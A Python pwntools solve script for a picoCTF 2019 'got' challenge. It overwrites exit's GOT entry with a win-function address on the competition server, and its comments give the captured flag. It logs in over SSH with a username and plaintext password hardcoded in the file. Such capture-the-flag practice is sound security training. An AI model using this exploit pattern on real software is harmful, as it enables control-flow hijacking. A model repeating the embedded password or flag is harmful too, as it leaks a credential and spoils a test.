#!/usr/bin/env python3

# Points: 350
# Category: Binary Exploitation
# Gist: GOT overwrite but no need to do format string exploit; just get in the decimal represenation of addrs u want to use
# Solved after comp by Ryan Nguyen
# Flag: picoCTF{A_s0ng_0f_1C3_and_f1r3_92b89b47}

from pwn import *

exe = ELF("./vuln")

# Addrs
exit_got = 0x804a01c
win = 0x080485c6

def conn():
	if False:
		return process([exe.path])
	else:
		shell = ssh(host='2019shell1.picoctf.com', user='giggsterpuku', password='7WH@L3ftc2')
		return shell.process("/problems/got_2_e69c12130456389b85a8174346be3689/vuln")

def main():
	r = conn()
	r.recvuntil("address\n")
	r.sendline(str(exit_got))
	r.recvuntil("value?\n")
	r.sendline(str(win))
	#gdb.attach(r,'''
	#p *0x804a01c
	#x/20x $sp
	#''')
	r.interactive()

if __name__ == "__main__":
	main()
